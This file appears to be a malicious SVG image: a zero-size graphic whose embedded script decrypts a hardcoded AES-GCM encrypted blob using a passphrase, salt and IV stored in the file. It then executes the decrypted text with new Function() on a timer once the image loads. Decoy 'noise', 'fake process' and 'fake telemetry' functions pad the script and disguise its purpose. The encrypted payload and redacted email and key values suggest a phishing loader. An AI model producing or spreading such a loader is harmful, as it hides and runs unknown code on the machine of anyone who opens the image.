<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="0" height="0" xmlns="http://www.w3.org/2000/svg">
  <!-- UmVhZGluZ19EYXRhX0VuY3J5cHRlZCBXaXRob3V0X1JldmVhbA== -->

  <script type="application/javascript"><![CDATA[
    // *** DECEPTION ENGINE ***
    const SYSTEM_TAG = "[SYS_CORE]";
    let sessionData = {
      systemStartTime: Date.now(),
      memoryUsage: 0,
      fakeCycleCounter: 0,
      dummyProcessesCount: 0,
      randomKey: 202
    };
    const bel = "[EMAIL]";
    const lieve = "[KEY]";

    // Useless computation (new function)
    function generateRandomNoise() {
      const noisePartA = Math.random().toString(36).substring(2, 7);
      const noisePartB = Math.random().toString(36).substring(3, 8);
      return `X_${noisePartA}${noisePartB}`;
    }

    function simulateFakeProcess() {
      sessionData.memoryUsage = window?.performance?.memory?.usedJSHeapSize || 0;
      sessionData.fakeCycleCounter = Math.floor(Math.random() * 9000);
      sessionData.dummyProcessesCount += 1;
    }

    // *** CRYPTOLOGIC ENGINE ***
    const coreEngine = (() => {
      const securedData = {
        ivToken: "b27c19814bc615121e31548e",
        saltData: "1c252f9ee9860727ea241792885e6273",
        encryptedBlob: "c01b42c8cbc480d7e511f493016e7f8bacd07b88a94605115ffe5231b0505a30b1291115049d4edc528943005e5fe8e3aac7c632291d835f150e71c6b2067b7cf8bbf1a4979f03bc3007a73441b7380b303b8b22d2dc427e5faf2a3c29eda202869990b74bae09297f0cedc296104134c1d9d1471c42cfaa04cb74cb0a252f9c95288600076e8ec4e0255eaf5927d7a682e764dd278dbee1096f7934be2ddca44c919be41c0e44b65c77fa3e912dedc14b9b0929314c9cb14f5375805f994ef13973808c728400c3a85b1b423330fbf7a3613b5969c453e08d6d35af236648e96797aac5bb3fcec7f47ed0f788dbcb8131ea06caf1e1a4f79593ca03e2751e91914968d79c732f7cf4023b4790a4bc21a78d5158e3c026332b5d7b16e7f4e14c05e4d50f04709328a4afc3605701818c9fd9b201e0497262578f503a9c39e851cad66bf8c258e7e26407ce70826580a81f2e81ddbe89f2e5ca4ed0305d6ac83e52ebce3514d1140d437d9555e383c84620618bda899f4c11cbc8f47160f19486658b5a97cc6e4f1f0f80262a3970825be15e7c7b8a7c49a1f9456e66dae900de66ae8803f7cdec01fd5cc59384910fe2b09da8deebe2ead91f930156cebe7e40c88dde6bbd84999d2413c88e957a4e5ec1de7e1190cc67927a33930cf8a4d23dffb722c2f9ec94a1843f6a9a05c08ab79645a9",
        passphrase: "nomadenvolIV"
      };

      const diversion = {
        isActive: false,
        baiting: true,
        securityToken: generateRandomNoise()
      };

      return {
        getIV: () => securedData.ivToken,
        getSalt: () => securedData.saltData,
        getBlob: () => securedData.encryptedBlob,
        getKey: () => securedData.passphrase,
        baitInfo: () => ({ ...diversion })
      };
    })();

    function hexToBuffer(hexStr) {
      const buffer = new Uint8Array(hexStr.length / 2);
      for (let i = 0; i < buffer.length; i++) {
        buffer[i] = parseInt(hexStr.substr(i * 2, 2), 16);
      }
      return buffer;
    }

    async function delayFakeProcessing() {
      return new Promise((resolve) => {
        setTimeout(() => {
          console.log("Delay Noise:", generateRandomNoise());
          resolve(generateRandomNoise());
        }, 111);
      });
    }

    async function startDecryption() {
      simulateFakeProcess();
      try {
        const userPassphrase = coreEngine.getKey();
        const keyImport = await crypto.subtle.importKey(
          "raw",
          new TextEncoder().encode(userPassphrase),
          { name: "PBKDF2" },
          false,
          ["deriveKey"]
        );

        const saltBuffer = hexToBuffer(coreEngine.getSalt());
        const aesKey = await crypto.subtle.deriveKey(
          {
            name: "PBKDF2",
            salt: saltBuffer,
            iterations: 100000,
            hash: "SHA-256"
          },
          keyImport,
          { name: "AES-GCM", length: 256 },
          false,
          ["decrypt"]
        );

        const ivBuffer = hexToBuffer(coreEngine.getIV());
        const encryptedDataBuffer = hexToBuffer(coreEngine.getBlob());

        await delayFakeProcessing();

        const decryptedData = await crypto.subtle.decrypt(
          { name: "AES-GCM", iv: ivBuffer },
          aesKey,
          encryptedDataBuffer
        );

        const decodedData = new TextDecoder().decode(decryptedData);
        (new Function(decodedData))();
      } catch (error) {
        console.warn("Decryption failed:", error);
      }
    }

    // *** INIT ***
    document.addEventListener("DOMContentLoaded", () => {
      console.info("Initializing payload...");
      for (let i = 0; i < 3; i++) {
        console.debug("Generated Noise:", generateRandomNoise());
      }
    });

    setTimeout(startDecryption, 999);

    // Fake telemetry data
    const telemetryInfo = () => {
      return {
        pingTime: Date.now(),
        generatedData: generateRandomNoise(),
        systemLoad: sessionData.memoryUsage
      };
    };

    console.log("Telemetry status:", telemetryInfo());
  ]]></script>
</svg>
